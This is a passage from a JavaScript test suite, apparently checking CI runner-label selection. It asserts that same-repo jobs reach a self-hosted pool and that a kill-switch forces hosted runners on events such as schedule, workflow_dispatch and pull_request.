            ecsDisabled: false,
            eventName,
            sameRepo: true,
            assoc: 'NONE',
          }),
          ECS_LABELS,
          `${jobName} same-repo lane (${eventName}) must reach the pool`,
        );
      }
    });

    it(`${jobName} obeys the kill-switch on every event`, () => {
      for (const eventName of [
        'schedule',
        'workflow_dispatch',
        'issue_comment',
        'pull_request',
        'pull_request_review',
      ]) {
        assert.deepEqual(
          evalRunsOn(runsOn, {
            ecsDisabled: true,
            eventName,
            sameRepo: true,
            assoc: 'OWNER',
          }),
          HOSTED_LABELS,
          `kill-switch must win on ${eventName}`,
        );
      }
    });
  }
});
